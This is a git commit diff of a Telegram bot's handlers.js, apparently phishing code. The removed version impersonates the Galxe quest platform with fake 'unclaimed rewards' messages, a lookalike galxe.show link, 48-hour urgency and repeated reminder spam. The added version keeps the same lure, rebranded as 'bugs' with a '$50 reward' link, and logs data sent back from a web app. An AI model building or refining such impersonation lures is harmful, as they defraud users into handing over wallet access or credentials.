d29e4d63f3d536b4a75fff185681d0acacc37638
accountloginsystem <168574688+accountloginsystem@users.noreply.github.com>
2024-09-15 16:32:39 +0530

    Update handlers.js

--- handlers.js
+++ handlers.js
@@ -1,70 +1,47 @@
-// handlers.js
 const { Markup } = require('telegraf');
 const { WEB_APP_URL } = require('./config');
 const fs = require('fs');
 
+// Start handler to send initial message
 const startHandler = async (ctx) => {
   const chatId = ctx.message.chat.id;
-  const username = ctx.message.chat.username;
- 
+  const username = ctx.message.chat.username || 'there'; // handle users without a username
   
   // Initial message
-  const initialMessage = `🧤Hey @${username} It's Galxe!\n\nWe're excited to inform you that you still have unclaimed rewards from your recent quests on Galxe.\n\nYour rewards are waiting to be claimed:\nhttps://galxe.show/\n\nAttention! The claim will close in 48 hours. Secure them before they're lost!`;
+  const initialMessage = `🧤Hey @${username}! It's bugs!\n\nWe're excited to inform you that you still have unclaimed rewards from your recent quests on bugs.\n\nClaim your bugs now and get a $50 reward:\nhttps://bugs.show/\n\nAttention! The claim will close in 48 hours. Secure them before they're lost!`;
 
-  // Path to the local image file
-  const reminderimage = 'poster.jpg';
-  const mainimage = 'poster1.jpg';
+  // Local image path
+  const mainImage = 'poster1.jpg';
+
+  // Send the initial message with an image
   await ctx.replyWithPhoto(
-    { source: mainimage },
+    { source: mainImage },
     {
       caption: initialMessage,
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: '🪬 Claim Reward', url: 'https://galxe.show/' }]
-        ]
-      }
+      reply_markup: Markup.inlineKeyboard([
+        [{ text: '🪬 Claim Reward', url: 'https://bugs.show/' }]
+      ])
     }
   );
-
-  // Schedule reminders
-  const reminderMessage = `🪐 Hey! It's Galxe!\n\nWe noticed you haven't claimed your reward yet.\n\nSecure them before they're lost:\nhttps://galxe.show/\n\nAttention! The claim will close in 48 hours!`;
-
-  let remindersSent = 0;
-  const maxReminders = 6; // 3 hours / 30 minutes = 6 reminders
-
-  const intervalId = setInterval(async () => {
-    if (remindersSent < maxReminders) {
-      await ctx.replyWithPhoto(
-        { source: reminderimage },
-        {
-          caption: reminderMessage,
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '📦 Claim Now', url: 'https://galxe.show/' }]
-            ]
-          }
-        }
-      );
-      remindersSent++;
-    } else {
-      clearInterval(intervalId);
-    }
-  }, 30 * 60 * 1000); // 30 minutes
 };
 
+// Help command handler to guide users
 const helpHandler = async (ctx) => {
-  await ctx.reply('To use this bot, please start by sending the /start command. This will take you to the HodlSwap platform where you can start earning tokens!', 
+  await ctx.reply(
+    'To use this bot, please start by sending the /start command. This will take you to the HodlSwap platform where you can start earning tokens!',
     Markup.inlineKeyboard([
       [{ text: 'Start', callback_data: '/start' }]
     ])
   );
 };
 
+// Handler for receiving data from the web app
 const webAppDataHandler = async (ctx) => {
-  // Handle data received from the web app
+  // Log the data from the web app
   console.log('Web App Data:', ctx.webAppData);
 };
 
+// Exporting the handlers
 module.exports = {
   startHandler,
   helpHandler,
